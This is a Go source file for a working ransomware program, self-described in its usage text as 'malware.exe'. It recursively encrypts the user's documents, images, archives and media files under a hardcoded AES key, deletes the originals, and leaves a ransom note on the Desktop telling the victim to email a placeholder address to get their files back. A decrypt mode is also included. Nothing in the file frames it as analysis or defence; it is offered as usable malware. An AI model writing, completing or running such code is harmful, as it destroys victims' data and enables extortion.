package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
)

const (
	encryptedExtension = ".notgood"
	decryptionInfoFile = "decryption_key.txt"
	filePermission     = 0o644
)

var (
	rootDir             = "C:\\Users\\user\\Desktop" // change this to the directory you want to encrypt
	err                 error
	encryptionKey       = []byte("abcdefghijklmnopqrstuvwxyz012345")
	extensionsToEncrypt = []string{
		".txt", ".doc", ".docx", ".pdf", ".rtf",
		".xlsx", ".xls", ".csv", ".ppt", ".pptx",
		".mdb", ".accdb", ".jpg", ".jpeg", ".png",
		".gif", ".bmp", ".zip", ".rar", ".7z",
		".tar", ".gz", ".tgz", ".mp3", ".wav",
		".mp4", ".avi", ".mkv", ".mov", ".wmv",
	}
)

func main() {
	switch {
	case len(os.Args) == 1:
		userHomeDir, err := os.UserHomeDir()
		if err != nil {
			fmt.Println("Error getting user home directory:", err)
			return
		}
		if !strings.Contains(userHomeDir, "user") { // replace "user" with the actual username if necessary
			rootDir = userHomeDir
		}
		fmt.Println("Encrypting files in", rootDir)
		fmt.Println("This might take some time...")
		encryptFiles()
	case len(os.Args) == 2 && os.Args[1] == "decrypt":
		decryptFiles()
	default:
		fmt.Println("Invalid arguments")
		fmt.Println("Usage: run <malware.exe> to encrypt files, run <malware.exe decrypt> to decrypt files")
	}
}

func encryptFiles() {
	macAddress := getMACAddress()
	if macAddress == nil {
		fmt.Println("Error getting mac address")
		return
	}
	fmt.Println(macAddress)
	nonce := generateRandomBytes(macAddress, 12)
	fmt.Println(string(nonce))

	_ = filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Error walking root directory")
			return err
		}

		if info.IsDir() {
			return nil
		}

		extension := strings.ToLower(filepath.Ext(path))

		if isValidExt(extension) {
			pathToEncrypt := path + encryptedExtension
			encryptFile(path, pathToEncrypt, nonce)
		}

		return nil
	})

	saveTXTWithNonce(nonce)
}

func encryptFile(path, encryptedPath string, nonce []byte) {
	fileBytes, _ := os.ReadFile(path)
	block, _ := aes.NewCipher([]byte(encryptionKey))
	aescgm, _ := cipher.NewGCM(block)
	encryptedData := aescgm.Seal(nil, nonce, fileBytes, nil)
	encryptedFileBytes := append(nonce, encryptedData...)
	_ = os.WriteFile(encryptedPath, encryptedFileBytes, filePermission)
	_ = os.Remove(path)
}

func getMACAddress() []byte {
	interfaces, _ := net.Interfaces()

	for _, iface := range interfaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}

		mac := iface.HardwareAddr.String()
		fmt.Println(mac)
		if len(mac) > 0 {
			return []byte(mac)
		}
	}
	return nil
}

func generateRandomBytes(seed []byte, length int) []byte {
	h := sha1.New()
	h.Write(seed)
	hash := h.Sum(nil)

	randBytes := make([]byte, length)
	copy(randBytes, hash[:length])
	return randBytes
}

func isValidExt(ext string) bool {
	for _, e := range extensionsToEncrypt {
		if e == ext {
			return true
		}
	}
	return false
}

func saveTXTWithNonce(nonce []byte) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println(err)
		return
	}

	deskDir := filepath.Join(homeDir, "Desktop")
	decryptKeyPath := filepath.Join(deskDir, decryptionInfoFile)
	nonceHex := hex.EncodeToString(nonce)

	msg := fmt.Sprintf("All of your files have been encrypted. \n To unlock them contact me with your encryption code in this email@email.com \n Your encryption code is: <%v> ", nonceHex)

	os.WriteFile(decryptKeyPath, []byte(msg), filePermission)

	fmt.Println("You can find decryption key at: ", decryptKeyPath)
}

func decryptFiles() {
	nonce := getNonceFromFile()
	if nonce == nil {
		fmt.Println("Failed")
		return
	}

	_ = filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}

		extension := strings.ToLower(filepath.Ext(path))
		if extension == encryptedExtension {
			decryptPath := strings.TrimSuffix(path, encryptedExtension)
			decryptFile(path, decryptPath, nonce)
		}
		return nil
	})
}

func getNonceFromFile() []byte {
	homeDir, _ := os.UserHomeDir()

	deskDir := filepath.Join(homeDir, "Desktop")
	decryptKeyPath := filepath.Join(deskDir, decryptionInfoFile)

	fileBytes, _ := os.ReadFile(decryptKeyPath)

	content := string(fileBytes)

	keyStartIndex := strings.Index(content, "<")
	keyEndIndex := strings.Index(content, ">")
	if keyStartIndex == -1 || keyEndIndex == -1 || keyStartIndex+1 >= keyEndIndex {
		fmt.Println("Nonce not found")
		return nil
	}

	nonceHex := content[keyStartIndex+1 : keyEndIndex]
	nonce, _ := hex.DecodeString(nonceHex)

	return nonce
}

func decryptFile(encryptedPath, decryptedPath string, nonce []byte) {
	encryptFileBytes, _ := os.ReadFile(encryptedPath)

	nonceSize := 12
	if len(encryptFileBytes) < nonceSize {
		fmt.Println("invalid encrypted file")
		return
	}

	cipherText := encryptFileBytes[nonceSize:]
	block, _ := aes.NewCipher([]byte(encryptionKey))

	gcm, _ := cipher.NewGCM(block)

	decryptedData, _ := gcm.Open(nil, nonce, cipherText, nil)

	os.WriteFile(decryptedPath, decryptedData, 0o644)

	os.Remove(encryptedPath)
}
